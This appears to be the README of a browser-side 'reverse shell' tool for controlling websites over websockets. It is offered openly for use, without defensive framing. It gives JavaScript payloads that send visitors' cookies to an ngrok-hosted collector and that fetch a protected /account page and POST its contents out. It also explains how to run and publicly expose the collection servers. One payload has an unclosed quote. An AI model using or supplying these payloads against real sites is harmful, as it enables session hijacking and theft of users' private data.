## about shell
A reverse shell for controlling any website via websockets with a built-in HTTP server so you can receive data.

## Capture user cookies

```
fetch(`https://ngrok-url?cookie=${encodeURIComponent(document.cookie)}`)
```
## Capture protected page or data

```
fetch('/account)
    .then(p => p.text())
    .then(t =>
        fetch('https://ngrok-url', {
          method: "POST",
          headers: { 'Content-Type':'application/json' },
          body: JSON.stringify({p:t})
        })
) 
```
### Running the servers

The first step is to install depencencies:

```bash
npm install
```

Then you can run the regular HTTP server (CORS enabled):

```bash
npm run http
```

Or the websocket server:

```bash
npm run ws
```

_____________________________

### HTTPS/WSS/External access

You can use ngrok to connect via HTTPS, WSS or externally without changing any configuration.
https://dashboard.ngrok.com/get-started

Once it's installed, you can then expose the HTTP server:

```bash
ngrok http 8000
```

Or the Websocket server:

```bash
ngrok http 8080
```

_Just use wss://ngrok-url  instead of https://ngrok-url for wss connections_
<br>
if you dont want to use ngrok you can host them on heroku or vercel but insted of console.log write to a log file 